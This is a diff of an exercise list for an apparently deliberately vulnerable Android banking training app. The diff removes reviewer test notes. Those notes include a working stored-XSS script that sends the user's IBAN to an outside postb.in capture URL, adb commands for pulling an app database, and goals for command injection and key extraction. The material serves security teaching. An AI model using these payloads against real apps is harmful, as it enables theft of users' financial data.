@@ -33,6 +33,16 @@ Complete:
 - 11: solution adaptation
 - 12: solution adaptation
 
+- 24: ok
+- 25: ok
+- 26: solution adaptation (?), as not working on Ubuntu
+- 27: solution adaptation
+- 28: solution adaptation
+- 29: solution does not work for me
+- 30: ok
+
+
+
 
 
 
@@ -210,20 +220,10 @@ Android apps can use internal SQlite databases. The DIBA app, for instance, uses
 
 **Goal:** Get access to the database that stores the investments and list the made investments.
 
-**Check**: Works
-
-OK, one small mistake in solution: Missing s
-
-sqlite3 investments
-
 ### 25: Native Language Library (hard)
-Vulnerability 26 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app.
+Vulnerability 26 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app, in a native language library.
 
 **Goal:** Find the key. When solving vulnerability 26, you'll learn whether you have found the right key.
-
-**Check**: Works
-
-OK, add to solution why you are searching for "*.so"
 
 ### 26: Encrypted SQLite Database (hard)
 Just like with investments (see vulnerability 25), a local database is also used to store the made payments. This time, the developers tried to come up with a more secure solution by encrypting the database with a key hidden in the app. However, assuming an attacker finds this key and gets access to the device, he can still get the database and read its potentially sensitive content.
@@ -234,43 +234,12 @@ Just like with investments (see vulnerability 25), a local database is also used
 
 **Hint:** In the DIBA app, encryption of the payment database is done using [SQLCipher](https://www.zetetic.net/sqlcipher/). Note that this vulnerability is not because a problem of SQLCipher, but because the attacker can get access to the encryption key.
 
-**Check**: Could not test as I couldn't build SQLCipher
-Add to solution how we can found out that sqlcipher is used.
-
-This does not work:
-marc@clt-mob-t-6316 Desktop % adb shell "run-as ch.zhaw.securitylab.DIBA cat databases/payments" > payments.db
-run-as: package not debuggable: ch.zhaw.securitylab.DIBA
-
-As an alternative, use adb shell, then su. The copy the db to, e.g., /sdcard and from there, copy it to the local system with adb pull
-
-
 ### 27: WebView Cross-Site Scripting (medium)
 The DIBA app provides a survey to banking customers so they can provide some feedback. This survey is implemented using a WebView that contains a stored Cross-Site Scripting (XSS) vulnerability.
 
 **Goal:** Exploit the vulnerability so that whenever a user opens the survey screen, his IBAN (which is included at the top of the screen) is sent in a request to a host controlled by the attacker.
 
 **Hint:** An easy way to capture request is by using [PostBin](https://postb.in).
-
-**Check**: Works
-
-Change texts as follows:
-
-Your recently opened account IBAN:
-
-Please let us know what you think - provide a comment and a score from 1 (bad) to 5 (very good).
-
-And make sure to us good comments already in there, so use the following 3 examples:
-
-5: Very good service, thank you!
-3:  It’s OK, but I’ve seen better apps.
-2: Not happy, I’m thinking about using another bank. 
-
-Note: I only could do string concatenation with the concat method, but not with "+":
-
-<script>
-new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban=".concat(document.getElementById('iban').text));
-</script>
-
 
 ### 28: Cracking Weak Password (hard)
 
@@ -280,18 +249,6 @@ To get access to stock market data, an access code must be entered. Due to a vul
 
 **Hint:** The code is based on a common word and additionally uses letter capitalization and digits.
 
-**Check**: Works. But the solution should be adapted:
-
-- How can the attacker find out that hashing with salt is used? So maybe a foirst step should be to look at one of the decompiled activities.
-
-- Current step 2: Show the content of the filw with real salt & hash
-
-- Also write that one can use also other crackers, so john is just an example
-
-- The format dynamic_61 should be explained. I sent you two links yesterday that behind this format, there is SHA256 over a concatenated salt and password. So just refer to the URL that describes all the formats and briefly write why dynamic_61 is used.
-
-And in the app: Clicking "Stock Market" button brings me to the stock market without any password? And what does the Suscribe button do? I’m not sure that this is implemented correctly. Can you please explain?
-
 ### 29: Root Detection Bypass (hard)
 The DIBA app cointains a simple root detection mechanism. Whenever the app is started, it checks whether the Android device is rooted and displays a message if this is the case. In reality, the app would be now terminated to prevent its usage on rooted (and therefore less secure) devices. However, as a user has full control over the app, he can adapt it by removing the root detection check and as a result of this, the app can also be used on rooted devices.
 
@@ -299,22 +256,10 @@ The DIBA app cointains a simple root detection mechanism. Whenever the app is st
 
 **Hint:** To do this, you have to decompile the app using *apktool*, adapt the code, recompile the app again using *apktool* and sign it with *apksigner*.
 
-**Check**: Works
-
-Check again with updated solution.
-
-Note: Finding this in smali is very difficult. How can the user find the correct code location?
-
 ### 30: Local Command Injection
-In the Meta-Settings, there's a *Ping Server* functionality to ping the server using the configured IP address. This uses the *ping* command in the Android operating system. The output of the ping command can be seen in the Android log. This functionality contains a command injection vulnerability that allows an attacker to execute arbitrary command in the Android system.
+In the Meta-Settings, there's a *Ping* functionality to ping the server using the configured IP address. This uses the *ping* command in the Android operating system. The output of the ping command can be seen in the Android log. This functionality contains a command injection vulnerability that allows an attacker to execute arbitrary command in the Android system.
 
 **Goal:** Exploit the vulnerability so that the content of the file *loginPreferences.xml* in shared preferences of the DIBA app is written to the Android log.
-
-**Check**: Works
-
-Write in the solution to use adb logcat to see the logs.
-
-And a problem in my VM: When entering the command, the PING button is no longer on the screen (I can go down with "Tab", but it’s of course not ideal… Maybe we can add the PING button next to the IP address?
 
 ### 31: Two-Factor Authentication I - Replaying Codes (easy)
 To confirm a payment, the user gets a payment confirmation code by SMS. Note that the SMS is simulated and written to the server output. This code is generated and used in an insecure way. A first problem is that it is not bound to a specific payment and that it can be used for multiple payments until it expires (which is after 5 minutes) - so it's not a one time confirmation code as it is supposed to be. This means that, e.g., a MITM can wait until the user has made and confirmed one payment. Based on this, the MITM can then make several additional payments using this code while the code is valid.
